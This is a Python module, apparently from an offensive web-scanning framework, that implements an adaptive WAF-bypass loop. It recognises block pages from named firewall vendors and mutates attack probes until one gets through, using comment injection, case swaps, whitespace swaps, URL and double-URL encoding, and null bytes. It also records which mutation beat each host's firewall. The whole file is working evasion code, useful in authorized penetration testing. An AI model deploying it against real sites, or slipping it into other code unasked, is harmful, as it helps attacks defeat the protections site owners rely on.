"""Adaptive WAF-bypass loop — when a probe is blocked, mutate and retry.

A real WAF turns true positives into silent misses: the payload that would have
worked gets a 403 before the app ever sees it. This engine detects a block, walks
a set of encoding mutations (comment-injection, case-swap, whitespace swaps, URL/
double-URL encoding, null byte), retries each, and — crucially — REMEMBERS the
mutation that got through for that host, so every later probe tries the known-good
bypass first. Pure logic over a caller-supplied `send`, so it's testable against a
mock WAF and reusable by any worker.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Awaitable, Callable, List, Tuple
from urllib.parse import quote

# Statuses a WAF/IPS typically returns for a blocked request.
_WAF_STATUS = {403, 406, 429, 501, 503}
# Body fingerprints of common WAFs / block pages.
_WAF_MARKERS = ("mod_security", "modsecurity", "cloudflare", "incapsula",
                "imperva", "akamai", "request blocked", "access denied",
                "attention required", "web application firewall", "blocked by",
                "request rejected", "not acceptable")


def is_blocked(resp) -> bool:
    """True if the response looks like a WAF/IPS block (status or body marker)."""
    if resp is None:
        return False                      # connection error, not a block signal
    status = getattr(resp, "status", 0) or 0
    if status in _WAF_STATUS:
        return True
    body = (getattr(resp, "body", "") or "").lower()
    return any(m in body for m in _WAF_MARKERS)


def _mixed_case(p: str) -> str:
    out, upper = [], True
    for ch in p:
        out.append(ch.upper() if upper else ch.lower())
        if ch.isalpha():
            upper = not upper
    return "".join(out)


# (label, transform). Order is the default retry order after "raw".
_MUTATORS: List[Tuple[str, Callable[[str], str]]] = [
    ("comment", lambda p: p.replace(" ", "/**/")),
    ("case_swap", str.swapcase),
    ("mixed_case", _mixed_case),
    ("ws_tab", lambda p: p.replace(" ", "\t")),
    ("ws_newline", lambda p: p.replace(" ", "\n")),
    ("url_encode", lambda p: quote(p, safe="")),
    ("double_url", lambda p: quote(quote(p, safe=""), safe="")),
    ("null_byte", lambda p: p + "\x00"),
]


def mutate(payload: str) -> List[Tuple[str, str]]:
    """Return [(label, variant)] starting with the raw payload, then encodings."""
    out: List[Tuple[str, str]] = [("raw", payload)]
    seen = {payload}
    for label, fn in _MUTATORS:
        try:
            v = fn(payload)
        except Exception:
            continue
        if v and v not in seen:
            seen.add(v)
            out.append((label, v))
    return out


@dataclass
class BypassResult:
    response: object
    payload: str
    label: str          # which variant won ("raw" if no mutation was needed)
    bypassed: bool      # True iff a mutation was required to get through
    blocked: bool       # True iff every variant was blocked


class AdaptiveBypass:
    """Per-target learning: the mutation that beat a host's WAF is tried first."""

    def __init__(self, *, max_variants: int = 8) -> None:
        self.max_variants = max(1, int(max_variants))
        self._learned: dict[str, str] = {}

    def learned(self, target: str):
        return self._learned.get(target)

    def _ordered(self, payload: str, target: str) -> List[Tuple[str, str]]:
        muts = mutate(payload)
        win = self._learned.get(target)
        if win:
            muts.sort(key=lambda lv: 0 if lv[0] == win else 1)   # known-good first
        return muts[:self.max_variants]

    async def run(self, send: Callable[[str], Awaitable], payload: str, *,
                  target: str = "") -> BypassResult:
        """Send `payload` via `send(variant)`, escalating mutations on a block.

        Returns as soon as a variant is NOT blocked; records the winning mutation
        for `target`. If every variant is blocked, returns the last response with
        ``blocked=True`` (the caller decides — never a fabricated success)."""
        last = None
        for label, variant in self._ordered(payload, target):
            resp = await send(variant)
            last = (label, variant, resp)
            if not is_blocked(resp):
                if label != "raw":
                    self._learned[target] = label
                return BypassResult(resp, variant, label,
                                    bypassed=(label != "raw"), blocked=False)
        if last is None:
            return BypassResult(None, payload, "raw", bypassed=False, blocked=True)
        label, variant, resp = last
        return BypassResult(resp, variant, label, bypassed=False, blocked=True)
